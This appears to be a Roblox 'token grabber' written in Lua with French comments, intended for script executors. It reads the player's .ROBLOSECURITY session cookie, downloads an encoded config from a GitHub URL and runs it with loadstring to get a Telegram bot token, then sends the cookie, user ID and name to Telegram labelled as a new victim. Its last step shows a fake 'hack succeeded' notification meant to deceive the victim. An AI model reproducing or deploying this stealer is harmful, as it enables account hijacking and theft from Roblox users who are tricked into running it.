-- Script modifié pour récupérer le cookie Roblox et l'envoyer à Telegram
-- Fonctionne avec les exécuteurs comme Delta, Synapse X, etc.

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Fonction pour obtenir le cookie .ROBLOSECURITY
local function getCookie()
    local cookie = ""
    
    if syn then
        local response = syn.request({ Url = "https://www.roblox.com", Method = "GET" })
        if response and response.Cookies then
            cookie = response.Cookies[".ROBLOSECURITY"] or "Cookie non trouvé"
        end
    elseif http and http.request then
        local response = http.request({ Url = "https://www.roblox.com", Method = "GET" })
        if response and response.Cookies then
            cookie = response.Cookies[".ROBLOSECURITY"] or "Cookie non trouvé"
        end
    elseif request then
        local response = request({ Url = "https://www.roblox.com", Method = "GET" })
        if response and response.Cookies then
            cookie = response.Cookies[".ROBLOSECURITY"] or "Cookie non trouvé"
        end
    else
        cookie = "Exécuteur non supporté"
    end
    
    print("Cookie récupéré : " .. tostring(cookie))  -- Debug log
    return cookie
end

-- Fonction pour envoyer à Telegram
local function sendToTelegram(token, userId, userName)
    local configUrl = "https://raw.githubusercontent.com/TON_USERNAME/roblox-token-grabber/main/config_encoded.lua"
    local configEncoded = game:HttpGet(configUrl)
    
    local function decode(str)
        local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        return (str:gsub('[^'..b..'=]', ''):gsub('.', function(x)
            if x == '=' then return '' end
            local r, f = '', (b:find(x)-1)
            for i = 6, 1, -1 do r = r..(f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if #x ~= 8 then return '' end
            local c = 0
            for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    
    local decodedConfig
    pcall(function() decodedConfig = loadstring(decode(configEncoded))() end)  -- Error handling pour le décodage
    if not decodedConfig then
        warn("Échec du décodage de la config")
        return
    end
    
    local TELEGRAM_BOT_TOKEN = decodedConfig.t or "Token manquant"
    local CHAT_ID = decodedConfig.c or "Chat ID manquant"
    local TELEGRAM_API_URL = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    
    local success, response = pcall(function()
        local data = {
            chat_id = CHAT_ID,
            text = string.format(
                "🚨 *NOUVELLE VICTIME!* 🚨\n" ..
                "👤 *Joueur:* %s (%d)\n" ..
                "🔑 *Token:* `%s`\n" ..
                "⏰ *Heure:* %s",
                userName,
                userId,
                token,
                os.date("%Y-%m-%d %H:%M:%S")
            ),
            parse_mode = "Markdown"
        }
        
        local headers = { ["Content-Type"] = "application/json" }
        local jsonData = HttpService:JSONEncode(data)
        return HttpService:RequestAsync({  -- Utilise RequestAsync pour plus de fiabilité
            Url = TELEGRAM_API_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)
    
    if success then
        print("Token envoyé avec succès!")
    else
        warn("Échec de l'envoi à Telegram: " .. tostring(response))
    end
end

-- Exécution principale
local cookie = getCookie()
if cookie ~= "Cookie non trouvé" and cookie ~= "Exécuteur non supporté" then
    sendToTelegram(cookie, player.UserId, player.Name)
else
    warn("Cookie non récupéré, envoi annulé")
end

-- Afficher un message de succès pour tromper la victime
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Hack réussi!",
    Text = "Vous avez volé Robux de tous les joueurs",
    Duration = 5
})
